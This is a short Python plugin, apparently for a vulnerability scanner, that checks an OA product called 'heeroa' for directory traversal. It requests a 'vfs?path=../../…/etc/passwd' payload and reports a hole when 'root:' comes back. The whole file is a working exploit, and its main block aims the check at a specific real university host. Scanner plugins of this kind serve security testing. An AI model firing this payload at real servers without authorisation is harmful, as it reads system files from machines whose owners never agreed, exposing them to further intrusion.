#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = heeroa
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-058143

def assign(service, arg):
    if service == 'heeroa':
        return True, arg

def audit(arg):
    payload = "vfs?path=../../../../../../../../../../etc/passwd"
    target = arg + payload
    code, head, res, errcode, final_url = curl.curl2(target);
    if code == 200 and "root:" in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('heeroa', 'http://oa.lit.edu.cn/litoa/')[1])